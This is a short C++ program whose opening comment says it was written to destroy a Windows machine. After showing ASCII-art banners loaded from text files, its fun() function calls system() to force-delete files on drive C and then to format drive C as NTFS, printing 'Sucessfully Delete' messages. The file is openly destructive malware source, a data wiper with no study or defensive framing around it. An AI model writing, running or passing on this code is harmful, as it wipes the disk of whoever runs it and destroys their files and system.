/* This program is designed by Saroj kumar tharu to destory windows machine */
#include <iostream>
#include <stdlib.h>
#include<windows.h>
#include<conio.h>
using namespace std;
void welcome();
void fun();
void art(int , int , string); // type,speed,filename

int main()
{
	
	system("cls");
	welcome();

	
	fun();

	return 0;
}

void fun(){
		system(" del /f c: *");
	cout << endl
		 << "\t\t Sucessfully Delete";
	cout << endl
		 << "\t\t Format drive c";
	system("format c: /fs:NTFS");
	cout << endl
		 << "\t\t Delete drive c";
}

void welcome()
{
	string banner = "art/banner.txt";
	string Developer = "art/Developer.txt";
	string welcome = "art/Art.txt";
	string jj = "art/hack.txt";

	//system("cls");
	system("color 2f");
	art(99,2,welcome);
	Sleep(1000);
	
	system("cls");
	art(99,1,Developer);
	Sleep(1000);
	
	system("cls");
	system("color 47");
	art(99,1,jj);
	Sleep(1000);

}

void art(int type, int speed, string name)
{
	string filename(name);

	FILE *input_file = fopen(filename.c_str(), "r");
	unsigned char character;
	while (!feof(input_file))
	{
		character = getc(input_file);

		if (type == 99)
			Sleep(speed);
		else
			Sleep(0);

		cout << character << "";
	}
	cout << endl;
	fclose(input_file);
}
